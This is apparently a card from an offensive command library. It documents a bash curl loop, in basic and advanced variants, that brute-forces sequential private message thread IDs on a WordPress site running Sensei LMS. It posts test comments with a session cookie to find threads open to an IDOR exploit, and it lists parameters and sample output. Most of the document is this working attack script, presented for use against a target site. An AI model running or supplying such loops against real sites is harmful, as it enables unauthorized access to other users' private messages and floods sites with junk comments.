---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
data: >-
  for id in {100..200}; do curl -s -X POST -b "wordpress_logged_in_*=session"
  https://target.com/wp-comments-post.php -d "comment=test&submit=Post
  Comment&comment_post_ID=$id&comment_parent=0" | grep -q "success" && echo
  "Valid ID: $id"; done
tags:
  - brute-force
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:33.908Z'
verified: false
validated: true
submitted: true
---
# test-thread-id-access

## Command

```bash
for id in {100..200}; do curl -s -X POST -b "wordpress_logged_in_*=session" https://target.com/wp-comments-post.php -d "comment=test&submit=Post Comment&comment_post_ID=$id&comment_parent=0" | grep -q "success" && echo "Valid ID: $id"; done
```

## Description

This bash loop brute-forces sequential thread IDs in Sensei LMS by sending test POST requests and checking for success responses, identifying valid private message threads for IDOR exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{100..200}` | Range of IDs to test (adjust based on expected sequence) | Yes |
| `session` | Authenticated session cookie value | Yes |
| `target.com` | Target WordPress site URL | Yes |
| `comment=test` | Dummy message for testing | Yes |
| `comment_post_ID=$id` | Variable ID being tested | Yes |
| `comment_parent=0` | Ensures new reply | Yes |

## Examples

### Basic Usage

```bash
for id in {100..200}; do curl -s -X POST -b "wordpress_logged_in_*=session" https://target.com/wp-comments-post.php -d "comment=test&submit=Post Comment&comment_post_ID=$id&comment_parent=0" | grep -q "success" && echo "Valid ID: $id"; done
```

### Advanced Usage

```bash
for id in {1..500}; do response=$(curl -s -w "%{http_code}" -X POST -b "cookies" https://target.com/wp-comments-post.php -d "comment=&submit=Post Comment&comment_post_ID=$id&comment_parent=0"); if [[ $response == *"302"* ]]; then echo "Valid ID: $id"; fi; done
```

## Expected Output

Valid ID: 111
Valid ID: 115
(List of discovered thread IDs where the POST succeeds, indicating accessible threads.)

## Related

- [[commands/exploit-sensei-lms-idor-post]]
- [[procedures/Identify-Target-Private-Message-Thread-ID]]
